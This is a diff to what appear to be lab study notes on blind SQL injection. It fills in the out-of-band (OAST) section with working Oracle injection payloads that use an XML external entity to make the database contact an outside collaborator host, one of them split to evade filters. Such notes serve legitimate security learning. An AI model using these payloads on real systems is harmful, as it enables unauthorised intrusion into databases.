@@ -236,7 +236,22 @@ users_*some-random-string*, username_*some-random-string*, password_*some-random
 ```
 
 #### Blind SQL injection with out-of-band interaction (OAST)
-TODO
+- take response with trackingId
+- use payload from cheatsheet, but craft it accurately using correct concatenation for oracle db
+
+```
+TrackingId='''||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!
+ENTITY+%25+remote+SYSTEM+"http%3a//COLLAB.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)||'
+```
+- or just scan that point using burp pro then check payload which led to dns interaction:
+```
+TrackingId='''%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.
+0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20novwd%20SYSTEM%20%22http%3a%2f%2fCOLLAB.
+oasti'%7c%7c'fy.com%2f%22%3e%25novwd%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'
+
+TrackingId='''||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % 
+novwd SYSTEM "http://COLLAB.oasti'||'fy.com/">%novwd;]>'),'/l') from dual)||'
+```
 
 #### Blind SQL injection with out-of-band data exfiltration (OAST)
 TODO
